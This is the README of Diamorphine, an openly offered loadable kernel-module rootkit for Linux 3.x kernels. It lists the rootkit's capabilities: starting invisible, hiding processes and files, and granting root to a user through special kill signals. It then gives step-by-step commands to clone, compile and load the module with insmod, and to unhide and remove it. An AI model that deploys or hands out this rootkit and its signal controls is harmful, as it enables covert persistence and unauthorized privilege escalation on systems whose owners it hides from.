Diamorphine
===========

Diamorphine is a LKM rootkit for linux kernels 3.x

Features
--

- When loaded, the module starts invisible;

- Hide/unhide any process by sending a signal 31;

- Sending a signal 63(to any pid) makes the module become (in)visible;

- Sending a signal 64(to any pid) makes the given user become root;

- Files or directories starting with the MAGIC_PREFIX seems to disappear;

- Source: [https://github.com/m0nad/Diamorphine]

Instalation
--

Verify if the kernel is 3.x
```
uname -r
```

Clone the repository
```
git clone https://github.com/m0nad/Diamorphine
```

Enter the folder
```
cd Diamorphine
```

Compile
```
make
```

Load the module(as root)
```
insmod diamorphine.ko
```

Desinstalation
--

The module starts invisible, to remove you need to make its visible
```
kill -63 0
```

Then remove the module(as root)
```
rmmod diamorphine
```
